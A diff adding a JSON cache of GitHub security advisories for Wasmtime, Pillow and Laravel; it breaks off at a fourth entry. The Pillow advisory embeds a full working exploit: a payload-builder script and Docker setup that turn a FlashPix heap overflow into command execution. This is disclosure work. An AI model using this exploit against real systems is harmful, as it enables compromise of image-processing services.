@@ -1,0 +1,650 @@
+{
+  "GHSA-897f-g5gm-fmxm": {
+    "url": "https://api.github.com/advisories/GHSA-897f-g5gm-fmxm",
+    "fetched_at": "2026-10-24T10:11:58.039354+00:00",
+    "advisory": {
+      "ghsa_id": "GHSA-897f-g5gm-fmxm",
+      "cve_id": "CVE-2026-115889",
+      "url": "https://api.github.com/advisories/GHSA-897f-g5gm-fmxm",
+      "html_url": "https://github.com/advisories/GHSA-897f-g5gm-fmxm",
+      "summary": "Wasmtime: Bit-packing in Cranelift compiler causes silent overflow and miscompilation",
+      "description": "## Summary\n\nIn Wasmtime prior to v43, the Cranelift compiler backend bit-packs its SSA value indices in a way that can result in silent overflow in release builds, and result in incorrect value references in the IR resulting in arbitrary miscompilation. A very large Wasm function body, or one that is specially crafted to use many SSA values, can use this to force type-confusion or other arbitrary side-effects and escape the sandbox.\n\nCranelift was changed in Wasmtime v43 to use a full `u32` index, with checks if that limit is exceeded, and so is no longer susceptible to this bug.\n\n## Impact\n\nA Wasmtime engine with default settings (using the Cranelift backend) on any architecture/platform could experience a sandbox escape from a specially-crafted Wasm module.\n\n## Patches\n\nWasmtime v36.0.19 has been released which fixes this issue.",
+      "type": "reviewed",
+      "severity": "critical",
+      "repository_advisory_url": "https://api.github.com/repos/bytecodealliance/wasmtime/security-advisories/GHSA-897f-g5gm-fmxm",
+      "source_code_location": "https://github.com/bytecodealliance/wasmtime",
+      "identifiers": [
+        {
+          "value": "GHSA-897f-g5gm-fmxm",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-115889",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        "https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-897f-g5gm-fmxm",
+        "https://github.com/bytecodealliance/wasmtime/pull/12613",
+        "https://github.com/bytecodealliance/wasmtime/pull/14818",
+        "https://github.com/bytecodealliance/wasmtime/commit/ba8f7d70caa1825b7f64fa75cd9d03f4a438dae0",
+        "https://github.com/bytecodealliance/wasmtime/commit/f517bd6e890c7c1291ab9fe05d8cc0c9f11e56aa",
+        "https://github.com/bytecodealliance/wasmtime/releases/tag/v36.0.19",
+        "https://github.com/bytecodealliance/wasmtime/releases/tag/v43.0.0",
+        "https://rustsec.org/advisories/RUSTSEC-2026-0380.html",
+        "https://github.com/advisories/GHSA-897f-g5gm-fmxm"
+      ],
+      "published_at": "2026-10-23T22:02:20Z",
+      "updated_at": "2026-10-23T22:02:21Z",
+      "github_reviewed_at": "2026-10-23T22:02:20Z",
+      "nvd_published_at": null,
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "rust",
+            "name": "wasmtime"
+          },
+          "vulnerable_version_range": "< 36.0.19",
+          "first_patched_version": "36.0.19",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "rust",
+            "name": "wasmtime"
+          },
+          "vulnerable_version_range": ">= 37.0.0, < 43.0.0",
+          "first_patched_version": "43.0.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+          "score": 9.9
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-197",
+          "name": "Numeric Truncation Error"
+        },
+        {
+          "cwe_id": "CWE-843",
+          "name": "Access of Resource Using Incompatible Type ('Type Confusion')"
+        }
+      ],
+      "credits": [
+        {
+          "user": {
+            "login": "jaydns",
+            "id": 26211918,
+            "node_id": "MDQ6VXNlcjI2MjExOTE4",
+            "avatar_url": "https://avatars.githubusercontent.com/u/26211918?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/jaydns",
+            "html_url": "https://github.com/jaydns",
+            "followers_url": "https://api.github.com/users/jaydns/followers",
+            "following_url": "https://api.github.com/users/jaydns/following{/other_user}",
+            "gists_url": "https://api.github.com/users/jaydns/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/jaydns/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/jaydns/subscriptions",
+            "organizations_url": "https://api.github.com/users/jaydns/orgs",
+            "repos_url": "https://api.github.com/users/jaydns/repos",
+            "events_url": "https://api.github.com/users/jaydns/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/jaydns/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter"
+        }
+      ],
+      "comments": 4,
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+        "score": 9.9
+      }
+    }
+  },
+  "GHSA-5x8w-8jj5-q52h": {
+    "url": "https://api.github.com/advisories/GHSA-5x8w-8jj5-q52h",
+    "fetched_at": "2026-10-24T10:11:58.041105+00:00",
+    "advisory": {
+      "ghsa_id": "GHSA-5x8w-8jj5-q52h",
+      "cve_id": "CVE-2026-112398",
+      "url": "https://api.github.com/advisories/GHSA-5x8w-8jj5-q52h",
+      "html_url": "https://github.com/advisories/GHSA-5x8w-8jj5-q52h",
+      "summary": "Pillow: Heap buffer overflow in FlashPix (FPX) JPEG decoding leads to code execution",
+      "description": "### Credits\n\n**Researcher**: Alex Bouffard (mixbo@pebwalker.com)\n\n### Summary\n\nA heap buffer overflow in Pillow's FlashPix (FPX) JPEG-tile decoder lets an attacker achieve arbitrary code execution by getting an application to open a single crafted file with `Image.open()`. The file is recognized by content (the OLE2 magic), not by extension, so any service that opens or thumbnails untrusted uploads with the optional `olefile` dependency installed is reachable with no user interaction. In the PoC below, opening one crafted file executes an attacker-chosen command on stock Pillow 12.2.0 (x86_64 Ubuntu 24.04, glibc 2.39).\n\n### Details\n\n`FpxImagePlugin` decodes FlashPix (FPX) files, which are OLE2/CFBF compound documents.\n\n`Image.open()` auto-detects them from the OLE2 magic `D0CF11E0...` whenever the optional `olefile` package is installed (Pillow's documented dependency for FPX/MIC support), regardless of the file's extension.\n\nFor a JPEG-compressed subimage (`compression == 2`), the plugin builds a `\"jpeg\"` decode tile and derives the `(rawmode, jpegmode)` pair from attacker-controlled FPX color IDs through the `MODES` table ([`src/PIL/FpxImagePlugin.py` L25-L32](https://github.com/python-pillow/Pillow/blob/12.2.0/src/PIL/FpxImagePlugin.py#L25-L32)):\n\n```python\nMODES = {\n    ...\n    (0x00018000, 0x00017FFE): (\"RGBA\", \"LA\"),                # rawmode \"LA\"  (2 bytes/pixel)\n    ...\n    (0x00020000, 0x00020001, 0x00020002): (\"RGB\", \"YCC;P\"),  # rawmode \"YCC;P\"\n}\n```\n\nThe Imaging output buffer for the tile is sized for the rawmode (here `\"LA\"` = 2 bytes/pixel) ([`src/decode.c` L223-L226](https://github.com/python-pillow/Pillow/blob/12.2.0/src/decode.c#L223-L226)):\n\n```c\nstate->bytes = (state->bits * state->xsize + 7) / 8;   // \"LA\" gives 2 * xsize bytes/row\n...\nstate->buffer = (UINT8 *)calloc(1, state->bytes);\n```\n\nIn `JpegDecode.c` the rawmode string is mapped to a libjpeg `out_color_space`. Recognized modes (`CMYK`, `YCbCr`, `YCbCrK`, and so on) get a concrete colorspace, but `\"LA\"` and `\"YCC;P\"` are not recognized, so control reaches the fallback branch ([`src/libImaging/JpegDecode.c` L219-L221](https://github.com/python-pillow/Pillow/blob/12.2.0/src/libImaging/JpegDecode.c#L219-L221)):\n\n```c\n/* Disable decoder conversions. */\ncontext->cinfo.jpeg_color_space = JCS_UNKNOWN;\ncontext->cinfo.out_color_space  = JCS_UNKNOWN;\n```\n\nUnder `JCS_UNKNOWN`, libjpeg performs no color conversion and emits `cinfo.num_components` bytes per pixel, taken from the embedded JPEG's SOF marker, which the attacker sets to 4. So `jpeg_read_scanlines` writes `4 * width` bytes per row into a buffer allocated for only `2 * width` bytes ([`src/libImaging/JpegDecode.c` L252](https://github.com/python-pillow/Pillow/blob/12.2.0/src/libImaging/JpegDecode.c#L252)):\n\n```c\nok = jpeg_read_scanlines(&context->cinfo, &state->buffer, 1);   // writes 4*W into a 2*W buffer\n```\n\nThis is a heap out-of-bounds write with attacker-controlled length (the image width, up to tens of thousands of pixels, so about `2 * width` bytes of overflow per row) and attacker-controlled content (the decoded pixel data). The PoC weaponizes it: the overflow overwrites an adjacent Python `bytes` object's `ob_type` with a pointer to a fake `PyTypeObject` / `PyBufferProcs` vtable that the same overflow plants inside the decode buffer. When Pillow releases the input buffer, `PyBuffer_Release` walks `ob_type -> tp_as_buffer -> bf_releasebuffer` and executes `call *rax`; the PoC points that at `system@plt` (fixed, the interpreter binary is non-PIE) with `rdi` set to the command string, yielding command execution.\n\n### PoC\n\nTo facilitate an exact reproduction on an x86_64 machine, this PoC uses the version-pinned, ASLR-disabled Docker image from [Annex A](#annex-a-docker-setup).\n\nThe source code for the payload builder `make_payload.py` is in [Annex B](#annex-b-payload-builder-source).\n\n`vulnerable.py` is the program under test, a one-liner that opens the file it is given:\n\n```python\n#!/usr/bin/env python3\n# The entire vulnerable operation an application performs on an untrusted file.\nimport sys\nfrom PIL import Image\n\nImage.open(sys.argv[1]).load()\n```\n\nThe payload is a standalone `.fpx` file the attacker crafts on their own host; the target only ever opens the resulting file, so building it requires no access to or code execution on the target. We run `make_payload.py` inside the same container here purely for convenience, so its baked-in addresses (`--offset`, `system@plt`) match this pinned image. The payload redirects the hijacked indirect call to `system@plt` (`0x4206c0`, fixed because the interpreter binary is non-PIE) with a baked-in command:\n\n```console\n$ python3 make_payload.py --target 0x4206c0 --cmd id --out shell.fpx\n[control] shell.fpx: S=0xdc8800 target=0x4206c0 cmd='id' craft_iters=0 bad=0\n[control] opening it: vtable hijack -> call *0x4206c0 with rdi -> 'id'\n```\n\nThen open it with `vulnerable.py`:\n\n```console\n$ python3 vulnerable.py shell.fpx\nuid=0(root) gid=0(root) groups=0(root)\ncorrupted size vs. prev_size\n```\n\n`Image.open()` of the crafted file runs the baked command via `system(\"id\")`: command execution as the user running the image processing (root in the container).\n\nThe trailing `corrupted size vs. prev_size` is glibc aborting during interpreter teardown over the corrupted heap, after `id` has\nalready run.\n\nThe builder writes the command inline at the hijacked `rdi`, so `--cmd` is limited to 7 bytes (for example `id`, `id;w`). `--offset` and `system@plt` are constants of the pinned, ASLR-disabled image and hold across runs of it.\n\n### Impact\n\nThis is a heap-based buffer overflow (CWE-122) / out-of-bounds write (CWE-787) that leads to code execution. Any application or service that opens attacker-influenced files with Pillow and has the optional `olefile` dependency installed is affected: image upload and thumbnailing services, avatar and media processing, document and image conversion pipelines, and similar. Because detection is by OLE2 magic rather than file extension and the overflow is triggered during a normal `Image.open()` / `load`, a server that automatically processes an uploaded file is exploitable with no user interaction. The result is arbitrary command execution in the context of the process performing the image processing, leading to full compromise of that process and the data and privileges it holds.\n\n### Annex A: Docker setup\n\nThe PoC runs in a pinned Docker image so the environment is deterministic; the image installs a version-pinned Python (3.12.3) and the Pillow 12.2.0 wheel, and the builder is pure Pillow. The image's entrypoint disables ASLR (`setarch -R`) to reduce the system knowledge requirements. The single `--security-opt seccomp=unconfined` flag on `docker run` is required only because turning ASLR off uses the `personality()` syscall that Docker's default seccomp profile blocks. Run only on infrastructure you own.\n\n**1. Build the image.** Put `vulnerable.py` (PoC) and `make_payload.py`\n([Annex B](#annex-b-payload-builder-source)) in a directory with this `Dockerfile`:\n\n```dockerfile\nFROM ubuntu:24.04@sha256:786a8b558f7be160c6c8c4a54f9a57274f3b4fb1491cf65146521ae77ff1dc54\nRUN apt-get update && apt-get install -y --no-install-recommends \\\n        ca-certificates \\\n        python3.12=3.12.3-1ubuntu0.13 python3.12-venv=3.12.3-1ubuntu0.13 \\\n    && rm -rf /var/lib/apt/lists/*\nRUN python3.12 -m venv /opt/v \\\n    && /opt/v/bin/pip install --no-cache-dir \"Pillow==12.2.0\" \"olefile==0.47\"\nENV PATH=/opt/v/bin:$PATH\nWORKDIR /poc\n# ASLR is an OS mitigation unrelated to the bug; disable it in-image for a deterministic heap.\nENTRYPOINT [\"setarch\", \"-R\"]\nCMD [\"bash\"]\n```\n\n```console\n$ docker build -t fjpeg1-poc .\n...\nDownloading pillow-12.2.0-cp312-cp312-manylinux_2_27_x86_64.manylinux_2_28_x86_64.whl (7.1 MB)\nSuccessfully installed Pillow-12.2.0 olefile-0.47\nSuccessfully built 370344c832b6\nSuccessfully tagged fjpeg1-poc:latest\n```\n\n**2. Start the (ASLR-disabled) container shell** with the scripts mounted:\n\n```sh\ndocker run --rm -it --security-opt seccomp=unconfined -v \"$PWD:/poc\" -w /poc fjpeg1-poc\n```\n\n### Annex B: payload builder source\n\n`make_payload.py`:\n\n```python\n#!/usr/bin/env python3\n\"\"\"F-JPEG-1 payload builder for a 0-ASLR box (x86_64 + glibc), pure Pillow (no native toolchain).\nBuilds an .fpx whose embedded 4-component JPEG, decoded via Pillow's FpxImagePlugin -> JCS_UNKNOWN\npath, overflows the 2-byte/px decode buffer and overwrites an adjacent object's ob_type.\n  --crash      flood an adjacent ob_type with 0x42.. -> SIGSEGV in PyBuffer_Release\n  (default)    CONTROL: fake vtable at the fixed (no-ASLR) addresses -> call *--target\nDefaults target the pinned Docker image with ASLR disabled (setarch -R). See --help.\"\"\"\nimport sys, io, struct, math, argparse\nfrom PIL import Image\n\nW, H = 65000, 2\nSECT, OB_TYPE_OFF, DATA_PAD, SENTINEL = 512, 130024, 0x18000, 0x4142434445464748\nFREESECT, ENDOFCHAIN, FATSECT, NOSTREAM = 0xFFFFFFFF, 0xFFFFFFFE, 0xFFFFFFFD, 0xFFFFFFFF\nFPX_CLSID = bytes.fromhex(\"0067615654C1CE11855300AA00A1F95B\")\no32 = lambda v: struct.pack(\"<I\", v)\np64 = lambda v: struct.pack(\"<Q\", v)\nINV = bytes(255 - i for i in range(256))   # 8-bit inversion table\n\ndef jpeg(src):\n    b = io.BytesIO()\n    Image.frombytes(\"CMYK\", (W, H), bytes(src)).save(b, \"JPEG\", quality=100, subsampling=0)\n    return b.getvalue()\n\ndef decode_row(jpg):\n    # Predict what the vulnerable JCS_UNKNOWN path decodes, using Pillow itself: JCS_UNKNOWN emits\n    # the raw JPEG components R, while Pillow's own CMYK decode of the same file returns 255 - R\n    # (the Adobe-CMYK inversion). So 255 - Image.open(jpg) is exactly the vulnerable output. The\n    # last decoded row is the one that lands in (and overflows past) the buffer.\n    px = Image.open(io.BytesIO(jpg)).tobytes()\n    return px[(H - 1) * W * 4:].translate(INV)\n\ndef craft(targets, iters=40):  # decode-feedback exact write (JPEG is lossy -> iterate to converge)\n    # base fill 0xBD -> decodes to 0x42, so the overflow GAPS match the crash-mode flood pattern\n    # that reaches PyBuffer_Release cleanly (uniform 0x42 avoids a premature glibc free() abort).\n    src = bytearray(b\"\\xbd\" * (W * H * 4)); base = (H - 1) * W * 4; it = 0\n    for off, t in targets:\n        for i, v in enumerate(t): src[base + off + i] = src[off + i] = 255 - v\n    for it in range(iters):\n        dec = decode_row(jpeg(src)); bad = 0\n        for off, t in targets:\n            for i, v in enumerate(t):\n                if dec[off + i] != v:\n                    bad += 1\n                    src[base + off + i] = src[off + i] = max(0, min(255, src[base + off + i] + dec[off + i] - v))\n        if not bad: break\n    return jpeg(src), it, bad\n\ndef maxid_for(w, h):\n    s, i = max(w, h), 1\n    while s > 64: s //= 2; i += 1\n    return i - 1\nMAXID = maxid_for(W, H); RESNAME = \"Resolution %04d\" % MAXID\n\ndef image_contents():\n    ui4 = lambda v: o32(19) + o32(v); blob = lambda b: o32(65) + o32(len(b)) + b\n    cb = o32(1) + o32(2) + o32(0x00018000) + o32(0x00017FFE)        # FPX color -> rawmode \"LA\"\n    props = [(0x1000002, ui4(W)), (0x1000003, ui4(H)), (0x2000002 | (MAXID << 16), blob(cb))]\n    voff = 8 + 8 * len(props); idx = vals = b\"\"\n    for pid, v in props: idx += o32(pid) + o32(voff); vals += v; voff += len(v)\n    body = o32(len(props)) + idx + vals\n    return (struct.pack(\"<HHI\", 0xFFFE, 0, 0x00020005) + b\"\\x00\" * 16 + o32(1) + b\"\\x00\" * 16\n            + o32(48) + o32(len(body) + 4) + body)\n\ndef subimage_header():\n    b = bytearray(80)\n    for o, v in [(32, W), (36, H), (40, 1), (44, max(W, 256)), (48, max(H, 256)), (52, 2),\n                 (56, 36), (60, 16), (64, 0), (72, 2)]:\n        struct.pack_into(\"<I\", b, o, v)\n    return bytes(b)\n\ndef build_fpx(jpg, out):\n    data = b\"\\x00\" * 28 + jpg\n    assert len(data) <= DATA_PAD, (len(data), DATA_PAD)\n    pad = lambda x: x + b\"\\x00\" * ((-len(x)) % SECT)\n    sd = {\"ic\": pad(image_contents().ljust(4096, b\"\\x00\")),\n          \"hdr\": pad(subimage_header().ljust(4096, b\"\\x00\")),\n          \"dat\": pad(data.ljust(DATA_PAD, b\"\\x00\"))}\n    ns = lambda x: len(x) // SECT; order = [\"ic\", \"dat\", \"hdr\"]\n    dsec = math.ceil(6 * 128 / SECT); content = dsec + sum(ns(sd[k]) for k in order)\n    fsec = 1\n    while fsec * 128 < fsec + content: fsec += 1\n    pos = {}; cur = fsec; dstart = cur; cur += dsec\n    for k in order: pos[k] = cur; cur += ns(sd[k])\n    total = cur\n    fat = [FREESECT] * (fsec * 128)\n    for s in range(fsec): fat[s] = FATSECT\n    def chain(a, n):\n        for j in range(n): fat[a + j] = a + j + 1 if j < n - 1 else ENDOFCHAIN\n    chain(dstart, dsec)\n    for k in order: chain(pos[k], ns(sd[k]))\n    def de(nm, t, ch, l, r, st, sz, cl=b\"\\x00\" * 16):\n        n = (nm.encode(\"utf-16-le\") + b\"\\x00\\x00\").ljust(64, b\"\\x00\")[:64]\n        return (n + struct.pack(\"<HBB\", min((len(nm) + 1) * 2, 64), t, 1) + o32(l) + o32(r)\n                + o32(ch) + cl + o32(0) + b\"\\x00\" * 16 + o32(st) + struct.pack(\"<Q\", sz))\n    directory = pad(b\"\".join([\n        de(\"Root Entry\", 5, 1, NOSTREAM, NOSTREAM, ENDOFCHAIN, 0, FPX_CLSID),\n        de(\"Data Object Store 000001\", 1, 2, NOSTREAM, NOSTREAM, ENDOFCHAIN, 0),\n        de(\"\\x05Image Contents\", 2, NOSTREAM, NOSTREAM, 3, pos[\"ic\"], len(sd[\"ic\"])),\n        de(RESNAME, 1, 4, NOSTREAM, NOSTREAM, ENDOFCHAIN, 0),\n        de(\"Subimage 0000 Data\", 2, NOSTREAM, NOSTREAM, 5, pos[\"dat\"], len(sd[\"dat\"])),\n        de(\"Subimage 0000 Header\", 2, NOSTREAM, NOSTREAM, NOSTREAM, pos[\"hdr\"], len(sd[\"hdr\"]))]))\n    h = bytearray(512); h[0:8] = bytes.fromhex(\"D0CF11E0A1B11AE1\")\n    for o, fmt, *v in [(24, \"<HH\", 0x3E, 3), (28, \"<H\", 0xFFFE), (30, \"<HH\", 9, 6), (44, \"<I\", fsec),\n                       (48, \"<I\", dstart), (56, \"<I\", 4096), (60, \"<I\", ENDOFCHAIN), (68, \"<I\", ENDOFCHAIN)]:\n        struct.pack_into(fmt, h, o, *v)\n    for i in range(109): struct.pack_into(\"<I\", h, 76 + i * 4, i if i < fsec else FREESECT)\n    secs = [b\"\"] * total\n    for s in range(fsec): secs[s] = b\"\".join(o32(x) for x in fat[s * 128:(s + 1) * 128])\n    for j in range(dsec): secs[dstart + j] = directory[j * SECT:(j + 1) * SECT]\n    for k in order:\n        for j in range(ns(sd[k])): secs[pos[k] + j] = sd[k][j * SECT:(j + 1) * SECT]\n    open(out, \"wb\").write(bytes(h) + b\"\".join(secs))\n\ndef xhex(s): return int(s, 16)\n\nSYSTEM_PLT = 0x4206c0   # system@plt in the image's non-PIE python3.12 (fixed, no libc leak)\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"F-JPEG-1 .fpx payload builder (0-ASLR box)\")\n    ap.add_argument(\"--out\", required=True, help=\"output .fpx path\")\n    ap.add_argument(\"--crash\", action=\"store_true\",\n                    help=\"crash mode: flood an adjacent ob_type with 0x42.. and SIGSEGV (no addresses)\")\n    ap.add_argument(\"--heap-base\", type=xhex, default=0xbaa000,\n                    help=\"fixed heap base of the 0-ASLR box (default 0xbaa000)\")\n    ap.add_argument(\"--offset\", type=xhex, default=0x21e800,\n                    help=\"state->buffer - heap_base (default 0x21e800 -> S=0xdc8800)\")\n    ap.add_argument(\"--target\", type=xhex, default=SENTINEL,\n                    help=\"value called via the hijacked vtable; pass %#x (system@plt) for \"\n                         \"command execution (default is a sentinel for an RIP-control demo)\" % SYSTEM_PLT)\n    ap.add_argument(\"--cmd\", default=\"id\",\n                    help=\"command system() runs, written inline at obj+0 / rdi (<=7 bytes, e.g. id, id;w)\")\n    a = ap.parse_args()\n\n    if a.crash:\n        # Pillow's CMYK JPEG path decodes inverted (decoded = 255 - src), so flood source 0xBD\n        # to make the decoded overflow bytes 0x42 -> the adjacent ob_type becomes 0x4242424242424242.\n        build_fpx(jpeg(bytes([0xBD]) * (W * H * 4)), a.out)\n        print(\"[crash] %s: opening it overwrites an adjacent ob_type with 0x4242424242424242 \"\n              \"-> SIGSEGV in PyBuffer_Release (no addresses)\" % a.out)\n        return\n\n    if len(a.cmd.encode()) > 7:\n        sys.exit(\"--cmd must be <=7 bytes (it is written inline at obj+0, before ob_type)\")\n    S = a.heap_base + a.offset\n    A0, A1, B0, B1 = 0x2000, 0xA000, 0x100, 0x2000     # spray A = fake type, spray B = TARGET\n    tg = [(OB_TYPE_OFF, p64(S + (A0 + A1) // 2)),\n          (OB_TYPE_OFF - 8, a.cmd.encode() + b\"\\x00\")]      # obj+0 -> rdi for system()\n    tg += [(o, p64(S + 0x100)) for o in range(A0, A1, 8)]   # fake type -> spray B at +0xa0..+8\n    tg += [(o, p64(a.target)) for o in range(B0, B1, 8)]\n    jpg, it, bad = craft(tg)\n    build_fpx(jpg, a.out)\n    print(\"[control] %s: S=%#x target=%#x cmd=%r craft_iters=%d bad=%d\"\n          % (a.out, S, a.target, a.cmd, it, bad))\n    print(\"[control] opening it: vtable hijack -> call *%#x with rdi -> %r\" % (a.target, a.cmd))\n\nif __name__ == \"__main__\":\n    main()\n```",
+      "type": "reviewed",
+      "severity": "critical",
+      "repository_advisory_url": "https://api.github.com/repos/python-pillow/Pillow/security-advisories/GHSA-5x8w-8jj5-q52h",
+      "source_code_location": "https://github.com/python-pillow/Pillow",
+      "identifiers": [
+        {
+          "value": "GHSA-5x8w-8jj5-q52h",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-112398",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        "https://github.com/python-pillow/Pillow/security/advisories/GHSA-5x8w-8jj5-q52h",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-112398",
+        "https://github.com/python-pillow/Pillow/commit/242a059aedc1935097d9aa1dc3f099750467ba75",
+        "https://github.com/python-pillow/Pillow/releases/tag/13.0.0",
+        "https://github.com/advisories/GHSA-5x8w-8jj5-q52h"
+      ],
+      "published_at": "2026-10-23T21:55:21Z",
+      "updated_at": "2026-10-23T21:55:22Z",
+      "github_reviewed_at": "2026-10-23T21:55:21Z",
+      "nvd_published_at": "2026-10-19T22:17:07Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "pip",
+            "name": "pillow"
+          },
+          "vulnerable_version_range": "<= 12.3.0",
+          "first_patched_version": "13.0.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": 0.0
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+          "score": 9.2
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-122",
+          "name": "Heap-based Buffer Overflow"
+        },
+        {
+          "cwe_id": "CWE-787",
+          "name": "Out-of-bounds Write"
+        }
+      ],
+      "credits": [
+        {
+          "user": {
+            "login": "pebwalker",
+            "id": 239915578,
+            "node_id": "U_kgDODkzSOg",
+            "avatar_url": "https://avatars.githubusercontent.com/u/239915578?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/pebwalker",
+            "html_url": "https://github.com/pebwalker",
+            "followers_url": "https://api.github.com/users/pebwalker/followers",
+            "following_url": "https://api.github.com/users/pebwalker/following{/other_user}",
+            "gists_url": "https://api.github.com/users/pebwalker/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/pebwalker/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/pebwalker/subscriptions",
+            "organizations_url": "https://api.github.com/users/pebwalker/orgs",
+            "repos_url": "https://api.github.com/users/pebwalker/repos",
+            "events_url": "https://api.github.com/users/pebwalker/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/pebwalker/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter"
+        }
+      ],
+      "comments": 10,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      },
+      "epss": {
+        "percentage": 0.00321,
+        "percentile": 0.23691
+      }
+    }
+  },
+  "GHSA-f9x3-7vq9-cph6": {
+    "url": "https://api.github.com/advisories/GHSA-f9x3-7vq9-cph6",
+    "fetched_at": "2026-10-24T10:11:58.042378+00:00",
+    "advisory": {
+      "ghsa_id": "GHSA-f9x3-7vq9-cph6",
+      "cve_id": "CVE-2026-114509",
+      "url": "https://api.github.com/advisories/GHSA-f9x3-7vq9-cph6",
+      "html_url": "https://github.com/advisories/GHSA-f9x3-7vq9-cph6",
+      "summary": "Laravel TokenGuard authentication bypass through non-string API credentials",
+      "description": "Laravel's built-in TokenGuard, **when configured with a standard token-based API guard**, may be bypassed to authenticate as an arbitrary existing user without knowledge of their valid API token. \n\n**Under certain database configurations (MySQL/MariaDB)** an attacker can submit a specially crafted, non-string credential value that is mishandled during the authentication lookup, causing the underlying query to match an unintended user record rather than failing authentication as expected.\n\n### Impact\nAn unauthenticated attacker may authenticate as another user without possessing that user's API token, leading to authentication bypass and account takeover on any route protected by the affected guard.",
+      "type": "reviewed",
+      "severity": "critical",
+      "repository_advisory_url": "https://api.github.com/repos/laravel/framework/security-advisories/GHSA-f9x3-7vq9-cph6",
+      "source_code_location": "https://github.com/laravel/framework",
+      "identifiers": [
+        {
+          "value": "GHSA-f9x3-7vq9-cph6",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-114509",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        "https://github.com/laravel/framework/security/advisories/GHSA-f9x3-7vq9-cph6",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-114509",
+        "https://github.com/laravel/framework/commit/8dbb08bccac1be095dba4a9d259a419620f1e8a5",
+        "https://github.com/laravel/framework/commit/9b21ce0a9bb2b2599978bc0b0df4abea952ad31c",
+        "https://github.com/laravel/framework/releases/tag/v12.68.0",
+        "https://github.com/laravel/framework/releases/tag/v13.29.0",
+        "https://github.com/advisories/GHSA-f9x3-7vq9-cph6"
+      ],
+      "published_at": "2026-10-23T21:50:27Z",
+      "updated_at": "2026-10-23T21:50:28Z",
+      "github_reviewed_at": "2026-10-23T21:50:27Z",
+      "nvd_published_at": "2026-10-21T22:16:49Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "composer",
+            "name": "laravel/framework"
+          },
+          "vulnerable_version_range": ">= 13.0.0, < 13.29.0",
+          "first_patched_version": "13.29.0",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "composer",
+            "name": "laravel/framework"
+          },
+          "vulnerable_version_range": "< 12.68.0",
+          "first_patched_version": "12.68.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": 0.0
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+          "score": 9.2
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-287",
+          "name": "Improper Authentication"
+        },
+        {
+          "cwe_id": "CWE-1287",
+          "name": "Improper Validation of Specified Type of Input"
+        }
+      ],
+      "credits": [
+        {
+          "user": {
+            "login": "KIKOmanasijev",
+            "id": 34198639,
+            "node_id": "MDQ6VXNlcjM0MTk4NjM5",
+            "avatar_url": "https://avatars.githubusercontent.com/u/34198639?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/KIKOmanasijev",
+            "html_url": "https://github.com/KIKOmanasijev",
+            "followers_url": "https://api.github.com/users/KIKOmanasijev/followers",
+            "following_url": "https://api.github.com/users/KIKOmanasijev/following{/other_user}",
+            "gists_url": "https://api.github.com/users/KIKOmanasijev/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/KIKOmanasijev/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/KIKOmanasijev/subscriptions",
+            "organizations_url": "https://api.github.com/users/KIKOmanasijev/orgs",
+            "repos_url": "https://api.github.com/users/KIKOmanasijev/repos",
+            "events_url": "https://api.github.com/users/KIKOmanasijev/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/KIKOmanasijev/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter"
+        }
+      ],
+      "comments": 1,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      },
+      "epss": {
+        "percentage": 0.00403,
+        "percentile": 0.33431
+      }
+    }
+  },
+  "GHSA-cxf3-9h37-7rr8": {
+    "url": "https://api.github.com/advisories/GHSA-cxf3-9h37-7rr8",
